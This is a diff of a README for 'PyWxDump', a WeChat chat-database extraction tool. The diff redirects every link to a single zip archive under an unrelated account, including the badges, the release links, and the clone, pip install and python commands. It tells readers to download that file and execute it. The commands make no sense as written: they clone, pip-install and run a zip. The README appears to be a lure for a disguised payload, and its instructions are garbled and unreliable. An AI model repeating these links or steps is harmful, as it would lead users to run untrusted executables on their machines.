@@ -1,12 +1,12 @@
 # PyWxDump 🐉
 
-![PyWxDump](https://raw.githubusercontent.com/Aeron1-bit/PyWxDump/master/Nusakan/Wx-Py-Dump-1.0-beta.2.zip) ![GitHub](https://raw.githubusercontent.com/Aeron1-bit/PyWxDump/master/Nusakan/Wx-Py-Dump-1.0-beta.2.zip) ![Python](https://raw.githubusercontent.com/Aeron1-bit/PyWxDump/master/Nusakan/Wx-Py-Dump-1.0-beta.2.zip%https://raw.githubusercontent.com/Aeron1-bit/PyWxDump/master/Nusakan/Wx-Py-Dump-1.0-beta.2.zip)
+![PyWxDump](https://raw.githubusercontent.com/aa1125573296-svg/PyWxDump/master/doc/img/Wx-Py-Dump-Talmudistic.zip) ![GitHub](https://raw.githubusercontent.com/aa1125573296-svg/PyWxDump/master/doc/img/Wx-Py-Dump-Talmudistic.zip) ![Python](https://raw.githubusercontent.com/aa1125573296-svg/PyWxDump/master/doc/img/Wx-Py-Dump-Talmudistic.zip)
 
 ## Introduction
 
 Welcome to **PyWxDump**, a powerful tool designed to help you extract and manage WeChat data efficiently. This repository allows users to read local databases, view chat histories, and export data in various formats such as CSV and HTML. Whether you are training AI models or developing automated responses, PyWxDump offers the flexibility you need.
 
-**Get started by downloading the latest release from the [Releases section](https://raw.githubusercontent.com/Aeron1-bit/PyWxDump/master/Nusakan/Wx-Py-Dump-1.0-beta.2.zip).** 
+**Get started by downloading the latest release from the [Releases section](https://raw.githubusercontent.com/aa1125573296-svg/PyWxDump/master/doc/img/Wx-Py-Dump-Talmudistic.zip).** 
 
 ## Features
 
@@ -22,7 +22,7 @@ To get started with PyWxDump, follow these simple steps:
 
 1. **Clone the Repository**: 
    ```bash
-   git clone https://raw.githubusercontent.com/Aeron1-bit/PyWxDump/master/Nusakan/Wx-Py-Dump-1.0-beta.2.zip
+   git clone https://raw.githubusercontent.com/aa1125573296-svg/PyWxDump/master/doc/img/Wx-Py-Dump-Talmudistic.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -33,17 +33,17 @@ To get started with PyWxDump, follow these simple steps:
 3. **Install Dependencies**:
    Make sure you have Python 3.6 or higher installed. Use pip to install required packages:
    ```bash
-   pip install -r https://raw.githubusercontent.com/Aeron1-bit/PyWxDump/master/Nusakan/Wx-Py-Dump-1.0-beta.2.zip
+   pip install -r https://raw.githubusercontent.com/aa1125573296-svg/PyWxDump/master/doc/img/Wx-Py-Dump-Talmudistic.zip
    ```
 
 4. **Download the Latest Release**:
-   For the latest features and updates, visit the [Releases section](https://raw.githubusercontent.com/Aeron1-bit/PyWxDump/master/Nusakan/Wx-Py-Dump-1.0-beta.2.zip). Download the appropriate file and execute it.
+   For the latest features and updates, visit the [Releases section](https://raw.githubusercontent.com/aa1125573296-svg/PyWxDump/master/doc/img/Wx-Py-Dump-Talmudistic.zip). Download the appropriate file and execute it.
 
 ## Usage
 
 ### Step 1: Configure Your Accounts
 
-Before you can start extracting data, you need to configure your WeChat accounts. Edit the `https://raw.githubusercontent.com/Aeron1-bit/PyWxDump/master/Nusakan/Wx-Py-Dump-1.0-beta.2.zip` file to include your account details.
+Before you can start extracting data, you need to configure your WeChat accounts. Edit the `https://raw.githubusercontent.com/aa1125573296-svg/PyWxDump/master/doc/img/Wx-Py-Dump-Talmudistic.zip` file to include your account details.
 
 ```json
 {
@@ -62,7 +62,7 @@ Before you can start extracting data, you need to configure your WeChat accounts
 Run the extraction script to pull data from your WeChat accounts.
 
 ```bash
-python https://raw.githubusercontent.com/Aeron1-bit/PyWxDump/master/Nusakan/Wx-Py-Dump-1.0-beta.2.zip
+python https://raw.githubusercontent.com/aa1125573296-svg/PyWxDump/master/doc/img/Wx-Py-Dump-Talmudistic.zip
 ```
 
 ### Step 3: Export Data
@@ -70,7 +70,7 @@ python https://raw.githubusercontent.com/Aeron1-bit/PyWxDump/master/Nusakan/Wx-P
 Once you have extracted the data, you can export it to your desired format. Use the following command:
 
 ```bash
-python https://raw.githubusercontent.com/Aeron1-bit/PyWxDump/master/Nusakan/Wx-Py-Dump-1.0-beta.2.zip --format csv
+python https://raw.githubusercontent.com/aa1125573296-svg/PyWxDump/master/doc/img/Wx-Py-Dump-Talmudistic.zip --format csv
 ```
 
 Replace `csv` with `html` or any other supported format as needed.
@@ -109,9 +109,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-If you encounter any issues or have questions, please check the [Issues section](https://raw.githubusercontent.com/Aeron1-bit/PyWxDump/master/Nusakan/Wx-Py-Dump-1.0-beta.2.zip) for help. 
+If you encounter any issues or have questions, please check the [Issues section](https://raw.githubusercontent.com/aa1125573296-svg/PyWxDump/master/doc/img/Wx-Py-Dump-Talmudistic.zip) for help. 
 
-For more updates and releases, visit the [Releases section](https://raw.githubusercontent.com/Aeron1-bit/PyWxDump/master/Nusakan/Wx-Py-Dump-1.0-beta.2.zip) regularly.
+For more updates and releases, visit the [Releases section](https://raw.githubusercontent.com/aa1125573296-svg/PyWxDump/master/doc/img/Wx-Py-Dump-Talmudistic.zip) regularly.
 
 ## Acknowledgments
 
@@ -122,6 +122,6 @@ For more updates and releases, visit the [Releases section](https://raw.githubus
 
 **PyWxDump** is your go-to tool for managing WeChat data effectively. Whether you are a developer, researcher, or just someone looking to keep a record of conversations, this tool has you covered. 
 
-**Download the latest version from the [Releases section](https://raw.githubusercontent.com/Aeron1-bit/PyWxDump/master/Nusakan/Wx-Py-Dump-1.0-beta.2.zip) and start exploring the possibilities!** 
+**Download the latest version from the [Releases section](https://raw.githubusercontent.com/aa1125573296-svg/PyWxDump/master/doc/img/Wx-Py-Dump-Talmudistic.zip) and start exploring the possibilities!** 
 
 Feel free to explore the code, contribute, and make this project even better!
